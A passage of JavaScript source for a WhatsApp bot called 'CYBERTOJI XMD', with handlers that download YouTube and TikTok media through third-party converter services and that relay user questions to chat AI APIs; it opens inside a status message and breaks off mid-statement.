━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🛡️ الهجمات المكتشفة: ${antiBugTracker.size}
🔒 المحظورون: ${[...antiBugTracker.values()].filter(v => v.blocked).length}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🇭🇹 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`
  });
}

// =============================================
// 📥 FONCTIONS DE DOWNLOAD
// =============================================
// Dépendances requises (à installer sur votre serveur):
//   npm install @distube/ytdl-core play-dl node-fetch
// =============================================

// Importer dynamiquement pour éviter crash si non installé
async function getYtdl() {
  try { return (await import('@distube/ytdl-core')).default; }
  catch { return null; }
}
async function getPlayDl() {
  try { return await import('play-dl'); }
  catch { return null; }
}
async function getFetch() {
  try { return (await import('node-fetch')).default; }
  catch {
    try { return (await import('axios')).default; }
    catch { return null; }
  }
}

// ─── YOUTUBE AUDIO (MP3) - utilise play-dl uniquement (pas ytdl) ─────────────
async function handleYouTubeAudio(sock, args, remoteJid, senderJid, message) {
  if (!args.length) {
    await sock.sendMessage(remoteJid, {
      text: `🎵 *تحميل صوت YouTube*\n\nالاستخدام:\n${config.prefix}play [عنوان الأغنية أو رابط]\n\nأمثلة:\n${config.prefix}play despacito\n${config.prefix}play https://youtu.be/xxx`
    });
    return;
  }

  const query = args.join(' ');
  const loadMsg = await sock.sendMessage(remoteJid, {
    text: `🔍 *جاري البحث...*\n🎵 ${query}`
  });

  try {
    const playDl = await getPlayDl();
    if (!playDl) {
      await sock.sendMessage(remoteJid, {
        text: `❌ *play-dl non installé*\n\nLancer sur le serveur:\n\`npm install play-dl\``,
        edit: loadMsg.key
      });
      return;
    }

    // 1. Chercher la vidéo
    let videoUrl, title, author, duration;
    if (query.includes('youtube.com') || query.includes('youtu.be')) {
      videoUrl = query.trim();
    } else {
      const results = await playDl.search(query, { source: { youtube: 'video' }, limit: 1 });
      if (!results?.length) {
        await sock.sendMessage(remoteJid, { text: '❌ لم يتم العثور على نتائج', edit: loadMsg.key });
        return;
      }
      videoUrl = results[0].url;
      title    = results[0].title || query;
      author   = results[0].channel?.name || 'Unknown';
      duration = results[0].durationInSec || 0;
    }

    // 2. Obtenir les infos si pas déjà récupérées
    if (!title) {
      try {
        const info = await playDl.video_info(videoUrl);
        title    = info.video_details.title || 'Unknown';
        author   = info.video_details.channel?.name || 'Unknown';
        duration = info.video_details.durationInSec || 0;
      } catch(e) {
        title = query; author = 'Unknown'; duration = 0;
      }
    }

    // 3. Vérifier durée (max 10 min)
    if (duration > 600) {
      await sock.sendMessage(remoteJid, {
        text: `⚠️ الفيديو طويل جداً!\n⏱️ ${Math.floor(duration/60)}:${String(duration%60).padStart(2,'0')}\n🚫 الحد الأقصى: 10 دقائق`,
        edit: loadMsg.key
      });
      return;
    }

    await sock.sendMessage(remoteJid, {
      text: `📥 *جاري التحميل...*\n🎵 ${title}\n👤 ${author}\n⏱️ ${Math.floor(duration/60)}:${String(duration%60).padStart(2,'0')}`,
      edit: loadMsg.key
    });

    // 4. Streamer with play-dl (pas de "Sign in" car play-dl contourne ça)
    const stream = await playDl.stream(videoUrl, { quality: 0 }); // quality 0 = meilleur audio
    const chunks = [];
    await new Promise((resolve, reject) => {
      stream.stream.on('data', c => chunks.push(c));
      stream.stream.on('end', resolve);
      stream.stream.on('error', reject);
    });
    const audioBuffer = Buffer.concat(chunks);

    // 5. Envoyer l'audio
    await sock.sendMessage(remoteJid, {
      audio: audioBuffer,
      mimetype: 'audio/mp4',
      ptt: false
    });

    await sock.sendMessage(remoteJid, {
      text: `┏━━━  🎵 يوتيوب صوت  ━━━┓\n\n🎵 *${title}*\n👤 ${author}\n⏱️ ${Math.floor(duration/60)}:${String(duration%60).padStart(2,'0')}\n📏 ${(audioBuffer.length/1024/1024).toFixed(2)} MB\n\n┗━━━━━━━━━━━━━━━━━━━━━━┛\n*㋛ 𝙲𝚈𝙱𝙴𝚁𝚃𝙾𝙹𝙸 𝚇𝙼𝙳* 🇭🇹`,
      edit: loadMsg.key
    });

  } catch (err) {
    console.error('خطأ YouTube audio:', err.message);
    await sock.sendMessage(remoteJid, {
      text: `❌ *Download error*\n\n${err.message}\n\n💡 جرب:\n• كلمات بحث مختلفة\n• رابط يوتيوب مباشر\n• تأكد: \`npm install play-dl\``,
      edit: loadMsg.key
    });
  }
}

// ─── YOUTUBE VIDEO (MP4) - utilise play-dl uniquement ────────────────────────
async function handleYouTubeVideo(sock, args, remoteJid, senderJid, message) {
  if (!args.length) {
    await sock.sendMessage(remoteJid, {
      text: `🎬 *تحميل فيديو YouTube*\n\nالاستخدام:\n${config.prefix}ytvideo [عنوان أو رابط]\n\nمثال:\n${config.prefix}ytvideo funny cats`
    });
    return;
  }

  const query = args.join(' ');
  const loadMsg = await sock.sendMessage(remoteJid, {
    text: `🔍 *جاري البحث عن الفيديو...*\n🎬 ${query}`
  });

  try {
    const playDl = await getPlayDl();
    if (!playDl) {
      await sock.sendMessage(remoteJid, {
        text: `❌ *play-dl non installé*\n\nLancer: \`npm install play-dl\``,
        edit: loadMsg.key
      });
      return;
    }

    let videoUrl, title, author, duration;
    if (query.includes('youtube.com') || query.includes('youtu.be')) {
      videoUrl = query.trim();
    } else {
      const results = await playDl.search(query, { source: { youtube: 'video' }, limit: 1 });
      if (!results?.length) {
        await sock.sendMessage(remoteJid, { text: '❌ لم يتم العثور على نتائج', edit: loadMsg.key });
        return;
      }
      videoUrl = results[0].url;
      title    = results[0].title || query;
      author   = results[0].channel?.name || 'Unknown';
      duration = results[0].durationInSec || 0;
    }

    if (!title) {
      try {
        const info = await playDl.video_info(videoUrl);
        title    = info.video_details.title || 'Unknown';
        author   = info.video_details.channel?.name || 'Unknown';
        duration = info.video_details.durationInSec || 0;
      } catch(e) {
        title = query; author = 'Unknown'; duration = 0;
      }
    }

    // Max 5 minutes pour vidéo
    if (duration > 300) {
      await sock.sendMessage(remoteJid, {
        text: `⚠️ الفيديو طويل جداً!\n⏱️ ${Math.floor(duration/60)}:${String(duration%60).padStart(2,'0')}\n🚫 الحد الأقصى: 5 دقائق\n\n💡 استخدم ${config.prefix}play للصوت`,
        edit: loadMsg.key
      });
      return;
    }

    await sock.sendMessage(remoteJid, {
      text: `📥 *جاري تحميل الفيديو...*\n🎬 ${title}`,
      edit: loadMsg.key
    });

    // Stream vidéo with play-dl (360p)
    const stream = await playDl.stream(videoUrl, { quality: 2 }); // quality 2 = 360p approx
    const chunks = [];
    await new Promise((resolve, reject) => {
      stream.stream.on('data', c => chunks.push(c));
      stream.stream.on('end', resolve);
      stream.stream.on('error', reject);
    });
    const videoBuffer = Buffer.concat(chunks);

    if (videoBuffer.length > 60 * 1024 * 1024) {
      await sock.sendMessage(remoteJid, {
        text: `⚠️ الفيديو كبير جداً (${(videoBuffer.length/1024/1024).toFixed(1)} MB)\n🚫 الحد: 60 MB\n\n💡 استخدم ${config.prefix}play للصوت`,
        edit: loadMsg.key
      });
      return;
    }

    await sock.sendMessage(remoteJid, {
      video: videoBuffer,
      mimetype: 'video/mp4',
      caption: `┏━━━  🎬 يوتيوب فيديو  ━━━┓\n\n🎬 *${title}*\n👤 ${author}\n⏱️ ${Math.floor(duration/60)}:${String(duration%60).padStart(2,'0')}\n📏 ${(videoBuffer.length/1024/1024).toFixed(2)} MB\n\n┗━━━━━━━━━━━━━━━━━━━━━━┛\n*㋛ 𝙲𝚈𝙱𝙴𝚁𝚃𝙾𝙹𝙸 𝚇𝙼𝙳* 🇭🇹`
    });

    try { await sock.sendMessage(remoteJid, { delete: loadMsg.key }); } catch(e) {}

  } catch (err) {
    console.error('خطأ YouTube video:', err.message);
    await sock.sendMessage(remoteJid, {
      text: `❌ *Download error*\n\n${err.message}\n\n💡 جرب ${config.prefix}play للصوت فقط`,
      edit: loadMsg.key
    });
  }
}

// =============================================
// 🎵 NOUVEAU SYSTÈME PLAY — API + MENU INTERACTIF
// =============================================

// ─── HELPER: Trouver le videoId YouTube ──────────────────────────────────────
async function ytGetVideoId(query) {
  // Si c'est déjà un lien YouTube
  const ytMatch = query.match(/(?:youtu\.be\/|[?&]v=)([\w-]{11})/);
  if (ytMatch) return { videoId: ytMatch[1], title: query };

  // Chercher via YouTube Data API v3
  try {
    const apiUrl = `https://www.googleapis.com/youtube/v3/search?part=snippet&q=${encodeURIComponent(query)}&type=video&maxResults=1&key=${config.youtubeApiKey}`;
    const r    = await fetch(apiUrl, { signal: AbortSignal.timeout(12000) });
    const json = await r.json();
    const item = json?.items?.[0];
    if (item) return { videoId: item.id?.videoId, title: item.snippet?.title || query };
  } catch(e) { console.error('[YT Data API]', e.message); }

  // Fallback: chercher sur une API tierce
  try {
    const r = await fetch(`https://api-faa.my.id/faa/ytplayvid?q=${encodeURIComponent(query)}`, { signal: AbortSignal.timeout(12000) });
    const d = await r.json();
    if (d?.result?.searched_url) {
      const m = d.result.searched_url.match(/v=([\w-]{11})/);
      if (m) return { videoId: m[1], title: d.result.searched_title || query };
    }
  } catch(e) { console.error('[FAA API]', e.message); }

  throw new Error('Vidéo introuvable sur YouTube');
}

// ─── HELPER: Téléchargement AUDIO (MP3) ──────────────────────────────────────
async function ytResolveAudio(query) {
  const { videoId, title } = await ytGetVideoId(query);
  const watchUrl = `https://www.youtube.com/watch?v=${videoId}`;
  console.log('[ytResolveAudio] videoId:', videoId, 'title:', title);

  const audioApis = [
    // 1. cobalt.tools — audio only
    async () => {
      const r = await fetch('https://api.cobalt.tools/api/json', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
        body: JSON.stringify({ url: watchUrl, isAudioOnly: true, aFormat: 'mp3' }),
        signal: AbortSignal.timeout(20000)
      });
      const d = await r.json();
      if ((d.status === 'stream' || d.status === 'redirect') && d.url) return d.url;
      if (d.status === 'picker' && (d.audio || d.picker?.[0]?.url)) return d.audio || d.picker[0].url;
      throw new Error('cobalt audio: ' + (d.text || d.status || 'no url'));
    },
    // 2. y2mate — MP3
    async () => {
      const r1 = await fetch('https://www.y2mate.com/mates/analyzeV2/ajax', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `k_query=${encodeURIComponent(watchUrl)}&k_page=home&hl=en&q_auto=0`,
        signal: AbortSignal.timeout(15000)
      });
      const d1 = await r1.json();
      if (!d1.links?.mp3) throw new Error('y2mate: no mp3');
      const kId = Object.values(d1.links.mp3)[0]?.k;
      if (!kId) throw new Error('y2mate: no key');
      const r2 = await fetch('https://www.y2mate.com/mates/convertV2/index', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `vid=${videoId}&k=${kId}`,
        signal: AbortSignal.timeout(20000)
      });
      const d2 = await r2.json();
      if (d2.dlink) return d2.dlink;
      throw new Error('y2mate: no dlink');
    },
    // 3. loader.to — MP3
    async () => {
      const r1 = await fetch(`https://loader.to/ajax/download.php?format=mp3&url=${encodeURIComponent(watchUrl)}`, { signal: AbortSignal.timeout(15000) });
      const d1 = await r1.json();
      if (!d1.id) throw new Error('loader.to: no id');
      for (let i = 0; i < 12; i++) {
        await new Promise(r => setTimeout(r, 3000));
        const rp = await fetch(`https://loader.to/ajax/progress.php?id=${d1.id}`, { signal: AbortSignal.timeout(10000) });
        const dp = await rp.json();
        if (dp.download_url) return dp.download_url;
      }
      throw new Error('loader.to: timeout');
    },
  ];

  let lastErr = null;
  for (const api of audioApis) {
    try {
      const url = await api();
      if (url) { console.log('[ytResolveAudio] URL:', url); return { audioUrl: url, title, watchUrl, videoId }; }
    } catch(e) { lastErr = e; console.error('[ytResolveAudio API failed]', e.message); }
  }
  throw new Error(`Audio indisponible: ${lastErr?.message}`);
}

// ─── HELPER: Téléchargement VIDÉO (MP4) ──────────────────────────────────────
async function ytResolveVideo(query) {
  const { videoId, title } = await ytGetVideoId(query);
  const watchUrl = `https://www.youtube.com/watch?v=${videoId}`;
  console.log('[ytResolveVideo] videoId:', videoId, 'title:', title);

  const videoApis = [
    // 1. savefrom.net — Simple et rapide
    async () => {
      const r = await fetch(`https://api.savefrom.net/getInfo.php?url=${encodeURIComponent(watchUrl)}`, {
        headers: { 'User-Agent': 'Mozilla/5.0' },
        signal: AbortSignal.timeout(20000)
      });
      const txt = await r.text();
      // Chercher URL MP4 dans la réponse
      const match = txt.match(/"url":"(https:[^"]+\.mp4[^"]*)"/);
      if (match) return match[1].replace(/\\/g, '');
      throw new Error('savefrom: no mp4 url');
    },
    // 2. cobalt.tools — 360p
    async () => {
      const r = await fetch('https://api.cobalt.tools/api/json', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
        body: JSON.stringify({ url: watchUrl, vQuality: '360', isAudioMuted: false }),
        signal: AbortSignal.timeout(30000)
      });
      const d = await r.json();
      if ((d.status === 'stream' || d.status === 'redirect') && d.url) return d.url;
      if (d.status === 'picker' && d.picker?.length > 0) return d.picker[0].url;
      throw new Error('cobalt: ' + (d.text || d.status));
    },
    // 3. y2mate — MP4 360p
    async () => {
      const r1 = await fetch('https://www.y2mate.com/mates/analyzeV2/ajax', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `k_query=${encodeURIComponent(watchUrl)}&k_page=home&hl=en&q_auto=0`,
        signal: AbortSignal.timeout(25000)
      });
      const d1 = await r1.json();
      if (!d1.links?.mp4) throw new Error('y2mate: no mp4');
      const qualities = ['360p','144p','240p','480p'];
      let kId = null;
      for (const q of qualities) {
        if (d1.links.mp4[q]?.k) { kId = d1.links.mp4[q].k; break; }
      }
      if (!kId) kId = Object.values(d1.links.mp4)[0]?.k;
      if (!kId) throw new Error('y2mate: no key');
      const r2 = await fetch('https://www.y2mate.com/mates/convertV2/index', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `vid=${videoId}&k=${kId}`,
        signal: AbortSignal.timeout(30000)
      });
      const d2 = await r2.json();
      if (d2.dlink) return d2.dlink;
      throw new Error('y2mate: no dlink');
    },
    // 4. YouTube direct (ytdl-like extraction)
    async () => {
      const pageRes = await fetch(watchUrl, {
        headers: { 'User-Agent': 'Mozilla/5.0' },
        signal: AbortSignal.timeout(15000)
      });
      const html = await pageRes.text();
      // Chercher streamingData dans le HTML
      const match = html.match(/"streamingData":\s*({[^}]+})/);
      if (match) {
        const data = JSON.parse(match[1]);
        if (data.formats?.length > 0) {
          // Prendre le premier format avec audio+vidéo
          const fmt = data.formats.find(f => f.mimeType?.includes('video/mp4') && f.audioQuality);
          if (fmt?.url) return fmt.url;
        }
      }
      throw new Error('youtube direct: no format');
    },
  ];

  let lastErr = null;
  for (const api of videoApis) {
    try {
      const url = await api();
      if (url) { console.log('[ytResolveVideo] URL:', url); return { videoUrl: url, title, watchUrl, videoId }; }
    } catch(e) { lastErr = e; console.error('[ytResolveVideo API failed]', e.message); }
  }
  throw new Error(`Vidéo indisponible: ${lastErr?.message}`);
}

// Compatibilité ytSearch pour handlePlayMenu (cherche audio par défaut)
async function ytSearch(searchQuery) {
  const result = await ytResolveAudio(searchQuery);
  return {
    status: true,
    result: {
      searched_title: result.title,
      searched_url:   result.watchUrl,
      download_url:   result.audioUrl,
      videoId:        result.videoId
    }
  };
}

// Menu principal !play → choix audio/vidéo/ptt
async function handlePlayMenu(sock, args, remoteJid, senderJid, message) {
  const searchQuery = args.join(' ');

  // Réaction ✨
  try {
    await sock.sendMessage(remoteJid, { react: { text: "✨", key: message.key } });
  } catch(e) {}

  try {
    const data = await ytSearch(searchQuery);

    if (!data?.status || !data?.result) {
      await sock.sendMessage(remoteJid, { text: "❌ Video not found." });
      return;
    }

    const res = data.result;
    const p = config.prefix;

    const menuText =
`🎶 *YouTube Player*

📌 Title: *${res.searched_title || searchQuery}*
🔗 Link: ${res.searched_url || 'N/A'}

━━━━━━━━━━━━━━━━━━━━━━━
*Choose the format:*

1️⃣ ${p}playaudio ${searchQuery}
   → 🎵 Audio MP3

2️⃣ ${p}playvideo ${searchQuery}
   → 🎬 Vidéo MP4

3️⃣ ${p}playptt ${searchQuery}
   → 🎤 Voice message (PTT)

━━━━━━━━━━━━━━━━━━━━━━━
_Reply with the command of your choice_`;

    await sock.sendMessage(remoteJid, { text: menuText }, { quoted: message });

    // 🎵 Audio automatique après le menu play (si play.mp3 existe)
    await sendCmdAudio(sock, remoteJid);

    try {
      await sock.sendMessage(remoteJid, { react: { text: "✅", key: message.key } });
    } catch(e) {}

  } catch (e) {
    console.error("PLAY MENU ERROR:", e.message);
    await sock.sendMessage(remoteJid, {
      text: "❌ Error while searching YouTube.\n\n💡 Please try again in a few seconds."
    });
  }
}

// !playaudio → Audio MP3
async function handlePlayAudio(sock, args, remoteJid, senderJid, message) {
  const searchQuery = args.join(' ');

  try {
    await sock.sendMessage(remoteJid, { react: { text: "🎵", key: message.key } });
  } catch(e) {}

  await sock.sendMessage(remoteJid, { text: "⏳ Downloading audio..." });

  try {
    const data = await ytSearch(searchQuery);

    if (!data?.status || !data?.result) {
      await sock.sendMessage(remoteJid, { text: "❌ Video not found." });
      return;
    }

    const res = data.result;

    // Télécharger l'audio (fetch natif - vraie URL MP3)
    console.log('[AUDIO DL] URL:', res.download_url);
    const audioFetch = await fetch(res.download_url, {
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
      signal: AbortSignal.timeout(90000)
    });
    if (!audioFetch.ok) throw new Error(`Download HTTP ${audioFetch.status}`);
    const audioData = Buffer.from(await audioFetch.arrayBuffer());
    if (audioData.length < 1000) throw new Error('Fichier audio vide ou invalide');
    console.log('[AUDIO DL] Size:', audioData.length, 'bytes');

    await sock.sendMessage(remoteJid, {
      audio: audioData,
      mimetype: "audio/mpeg",
      fileName: `${res.searched_title || 'audio'}.mp3`,
    }, { quoted: message });

    await sock.sendMessage(remoteJid, {
      text: `🎶 *YouTube Audio*\n📌 *${res.searched_title || searchQuery}*`
    }, { quoted: message });

    try {
      await sock.sendMessage(remoteJid, { react: { text: "✅", key: message.key } });
    } catch(e) {}

  } catch (e) {
    console.error("PLAY AUDIO ERROR:", e.message);
    await sock.sendMessage(remoteJid, {
      text: "❌ Error while downloading audio.\n\n💡 Check the title or try again."
    });
  }
}

// !playvideo → Vidéo MP4
async function handlePlayVideo(sock, args, remoteJid, senderJid, message) {
  const searchQuery = args.join(' ');

  try {
    await sock.sendMessage(remoteJid, { react: { text: "🎬", key: message.key } });
  } catch(e) {}

  await sock.sendMessage(remoteJid, { text: "⏳ Downloading video... (may take 15-30s)" });

  try {
    // Utilise ytResolveVideo dédié pour obtenir une vraie URL MP4
    const result = await ytResolveVideo(searchQuery);

    // Télécharger le buffer vidéo
    console.log('[VIDEO DL] URL:', result.videoUrl);
    const videoFetch = await fetch(result.videoUrl, {
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
      signal: AbortSignal.timeout(180000)
    });
    if (!videoFetch.ok) throw new Error(`Download HTTP ${videoFetch.status}`);
    const videoData = Buffer.from(await videoFetch.arrayBuffer());
    if (videoData.length < 10000) throw new Error('Fichier vidéo vide ou invalide');
    console.log('[VIDEO DL] Size:', videoData.length, 'bytes');

    await sock.sendMessage(remoteJid, {
      video: videoData,
      mimetype: 'video/mp4',
      caption: `🎬 *YouTube Video*\n📌 *${result.title || searchQuery}*\n📏 ${(videoData.length/1024/1024).toFixed(1)} MB`,
      fileName: `${result.title || 'video'}.mp4`
    }, { quoted: message });

    try {
      await sock.sendMessage(remoteJid, { react: { text: "✅", key: message.key } });
    } catch(e) {}

  } catch (e) {
    console.error("PLAYVIDEO ERROR:", e.message);
    await sock.sendMessage(remoteJid, {
      text: `❌ *Video error:* ${e.message}\n\n💡 Try !playaudio for audio only.`
    }, { quoted: message });
  }
}

// !playptt → Voice message (PTT)
async function handlePlayPTT(sock, args, remoteJid, senderJid, message) {
  const searchQuery = args.join(' ');

  try {
    await sock.sendMessage(remoteJid, { react: { text: "🎤", key: message.key } });
  } catch(e) {}

  await sock.sendMessage(remoteJid, { text: "⏳ Downloading voice message..." });

  try {
    const data = await ytSearch(searchQuery);

    if (!data?.status || !data?.result) {
      await sock.sendMessage(remoteJid, { text: "❌ Video not found." });
      return;
    }

    const res = data.result;

    // Télécharger comme audio (fetch natif - vraie URL MP3)
    console.log('[PTT DL] URL:', res.download_url);
    const audioFetch = await fetch(res.download_url, {
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
      signal: AbortSignal.timeout(90000)
    });
    if (!audioFetch.ok) throw new Error(`Download HTTP ${audioFetch.status}`);
    const audioData = Buffer.from(await audioFetch.arrayBuffer());
    if (audioData.length < 1000) throw new Error('Fichier audio vide ou invalide');

    // Envoyer en mode PTT (message vocal)
    await sock.sendMessage(remoteJid, {
      audio: audioData,
      mimetype: "audio/mpeg",
      ptt: true
    }, { quoted: message });

    await sock.sendMessage(remoteJid, {
      text: `🎤 *Voice Note*\n📌 *${res.searched_title || searchQuery}*`
    });

    try {
      await sock.sendMessage(remoteJid, { react: { text: "✅", key: message.key } });
    } catch(e) {}

  } catch (e) {
    console.error("PLAY PTT ERROR:", e.message);
    await sock.sendMessage(remoteJid, {
      text: "❌ Error while downloading PTT.\n\n💡 Try again or use !playaudio"
    });
  }
}

// ─── GPT ─────────────────────────────────────────────────────────────────────
async function handleGPT(sock, args, remoteJid, senderJid, message) {
  const question = args.join(' ');
  if (!question) {
    await sock.sendMessage(remoteJid, {
      text: `🤖 *ChatGPT*\n\nUsage: ${config.prefix}gpt [question]\nExemple: ${config.prefix}gpt Explique la relativité`
    }, { quoted: message });
    return;
  }
  try {
    await sock.sendMessage(remoteJid, { react: { text: "🤖", key: message.key } });
    await sock.sendMessage(remoteJid, { text: "⏳ GPT is thinking..." });

    let reply = null;
    let modelUsed = '';

    // 1. Pollinations.ai (100% gratuit, sans clé)
    try {
      const pollUrl = `https://text.pollinations.ai/${encodeURIComponent(question)}?model=openai&seed=42&json=false`;
      const r = await fetch(pollUrl, { signal: AbortSignal.timeout(20000) });
      if (r.ok) {
        const txt = await r.text();
        if (txt && txt.length > 5) { reply = txt.trim(); modelUsed = 'GPT-4o (Pollinations)'; }
      }
    } catch(e) { console.error('[Pollinations]', e.message); }

    // 2. OpenAI officiel (si crédits disponibles)
    if (!reply) {
      try {
        const r = await fetch('https://api.openai.com/v1/chat/completions', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${config.openaiApiKey}` },
          body: JSON.stringify({ model: 'gpt-4o-mini', messages: [{ role: 'user', content: question }], max_tokens: 1000 }),
          signal: AbortSignal.timeout(20000)
        });
        const d = await r.json();
        if (!d.error && d.choices?.[0]?.message?.content) {
          reply = d.choices[0].message.content.trim();
          modelUsed = 'OpenAI GPT-4o-mini';
        }
      } catch(e) { console.error('[OpenAI]', e.message); }
    }

    // 3. Groq (gratuit - llama3)
    if (!reply && config.groqApiKey) {
      try {
        const r = await fetch('https://api.groq.com/openai/v1/chat/completions', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${config.groqApiKey}` },
          body: JSON.stringify({ model: 'llama3-8b-8192', messages: [{ role: 'user', content: question }], max_tokens: 1000 }),
          signal: AbortSignal.timeout(20000)
        });
        const d = await r.json();
        if (!d.error && d.choices?.[0]?.message?.content) {
          reply = d.choices[0].message.content.trim();
          modelUsed = 'Llama 3 (Groq)';
        }
      } catch(e) { console.error('[Groq]', e.message); }
    }

    if (!reply) throw new Error('Tous les services IA sont indisponibles. Réessaie dans quelques secondes.');

    await sock.sendMessage(remoteJid, {
      text: `🤖 *AI Assistant*\n━━━━━━━━━━━━━━━━━━━━━━━\n❓ ${question}\n━━━━━━━━━━━━━━━━━━━━━━━\n${reply}\n━━━━━━━━━━━━━━━━━━━━━━━\n_Powered by ${modelUsed}_`
    }, { quoted: message });
    try { await sock.sendMessage(remoteJid, { react: { text: "✅", key: message.key } }); } catch(e) {}
  } catch(e) {
    console.error('GPT ERROR:', e.message);
    await sock.sendMessage(remoteJid, { text: `❌ GPT Error: ${e.message}` }, { quoted: message });
  }
}

// ─── GEMINI ───────────────────────────────────────────────────────────────────
async function handleGemini(sock, args, remoteJid, senderJid, message) {
  const question = args.join(' ');
  if (!question) {
    await sock.sendMessage(remoteJid, {
      text: `✨ *Google Gemini*\n\nUsage: ${config.prefix}gemini [question]\nExemple: ${config.prefix}gemini Qu'est-ce que le Big Bang?`
    }, { quoted: message });
    return;
  }
  try {
    await sock.sendMessage(remoteJid, { react: { text: "✨", key: message.key } });
    await sock.sendMessage(remoteJid, { text: "⏳ Gemini is thinking..." });

    let reply = null, modelUsed = '';

    // 1. Gemini API officielle
    try {
      const r = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${config.geminiApiKey}`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ contents: [{ parts: [{ text: question }] }], generationConfig: { maxOutputTokens: 1000 } }),
        signal: AbortSignal.timeout(25000)
      });
      const d = await r.json();
      if (!d.error && d.candidates?.[0]?.content?.parts?.[0]?.text) { reply = d.candidates[0].content.parts[0].text.trim(); modelUsed = 'Google Gemini 2.0'; }
    } catch(e) { console.error('[Gemini]', e.message); }

    // 2. Pollinations openai (POST)
    if (!reply) {
      try {
        const r = await fetch('https://text.pollinations.ai/', {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ messages: [{ role: 'user', content: question }], model: 'openai', seed: 42 }),
          signal: AbortSignal.timeout(30000)
        });
        if (r.ok) { const t = await r.text(); if (t?.length > 5) { reply = t.trim(); modelUsed = 'GPT-4o (Pollinations)'; } }
      } catch(e) { console.error('[Pollinations openai]', e.message); }
    }

    // 3. Pollinations mistral (POST)
    if (!reply) {
      try {
        const r = await fetch('https://text.pollinations.ai/', {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ messages: [{ role: 'user', content: question }], model: 'mistral', seed: 42 }),
          signal: AbortSignal.timeout(30000)
        });
        if (r.ok) { const t = await r.text(); if (t?.length > 5) { reply = t.trim(); modelUsed = 'Mistral (Pollinations)'; } }
      } catch(e) { console.error('[Pollinations mistral]', e.message); }
    }

    if (!reply) throw new Error('Tous les services IA sont indisponibles. Réessaie plus tard.');

    await sock.sendMessage(remoteJid, {
      text: `✨ *AI Assistant*\n━━━━━━━━━━━━━━━━━━━━━━━\n❓ ${question}\n━━━━━━━━━━━━━━━━━━━━━━━\n${reply}\n━━━━━━━━━━━━━━━━━━━━━━━\n_Powered by ${modelUsed}_`
    }, { quoted: message });
    try { await sock.sendMessage(remoteJid, { react: { text: "✅", key: message.key } }); } catch(e) {}
  } catch(e) {
    console.error('GEMINI ERROR:', e.message);
    await sock.sendMessage(remoteJid, { text: `❌ Gemini Error: ${e.message}` }, { quoted: message });
  }
}

// ─── TIKTOK ──────────────────────────────────────────────────────────────────
async function handleTikTok(sock, args, remoteJid, senderJid, message) {
  try {
    // Headers pour savett.cc
    const headers = {
      'Content-Type': 'application/x-www-form-urlencoded',
      Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      Origin: 'https://savett.cc',
      Referer: 'https://savett.cc/en1/download',
      'User-Agent': 'Mozilla/5.0'
    };

    // Helpers
    async function getCsrfCookie() {
      const res = await axios.get('https://savett.cc/en1/download', { headers });
      const csrf = res.data.match(/name="csrf_token" value="([^"]+)"/)?.[1] || null;
      const cookie = (res.headers['set-cookie'] || []).map(v => v.split(';')[0]).join('; ');
      return { csrf, cookie };
    }

    async function postDl(url, csrf, cookie) {
      const body = `csrf_token=${encodeURIComponent(csrf)}&url=${encodeURIComponent(url)}`;
      const res = await axios.post('https://savett.cc/en1/download', body, {
        headers: { ...headers, Cookie: cookie },
        timeout: 30000
      });
      return res.data;
    }

    function parseHtml(html) {
      const $ = cheerio.load(html);
      const data = {
        username: $('#video-info h3').first().text().trim() || null,
        type: null,
        downloads: { nowm: [], wm: [] },
        mp3: [],
        slides: []
      };

      const slides = $('.carousel-item[data-data]');
      if (slides.length) {
        data.type = 'photo';
        slides.each((_, el) => {
          try {
            const json = JSON.parse($(el).attr('data-data').replace(/&quot;/g, '\"'));
            if (Array.isArray(json.URL)) {
              json.URL.forEach(url => data.slides.push({ index: data.slides.length + 1, url }));
            }
          } catch {}
        });
        return data;
      }

      data.type = 'video';
      $('#formatselect option').each((_, el) => {
        const label = $(el).text().toLowerCase();
        const raw = $(el).attr('value');
        if (!raw) return;
        try {
          const json = JSON.parse(raw.replace(/&quot;/g, '\"'));
          if (!json.URL) return;
          if (label.includes('mp4') && !label.includes('watermark')) data.downloads.nowm.push(...json.URL);
          if (label.includes('watermark')) data.downloads.wm.push(...json.URL);
          if (label.includes('mp3')) data.mp3.push(...json.URL);
        } catch {}
      });
      return data;
    }

    async function savett(url) {
      const { csrf, cookie } = await getCsrfCookie();
      if (!csrf) throw new Error('CSRF token not found');
      const html = await postDl(url, csrf, cookie);
      return parseHtml(html);
    }

    async function fetchBuf(u) {
      try {
        const r = await axios.get(u, { responseType: 'arraybuffer', timeout: 30000 });
        return Buffer.from(r.data);
      } catch (e) {
        console.error('[TIKTOK] fetch error', e?.message);
        return null;
      }
    }

    // Validation URL
    const url = (args[0] || '').trim();
    if (!url || !/^https?:\/\//i.test(url)) {
      await sock.sendMessage(remoteJid, { text: '❗ Usage: !tiktok <url>\nExample: !tiktok https://vt.tiktok.com/xxxxx' }, { quoted: message });
      return;
    }

    // Message de progression TikTok
    const ttLoadMsg = await sock.sendMessage(remoteJid, {
      text:
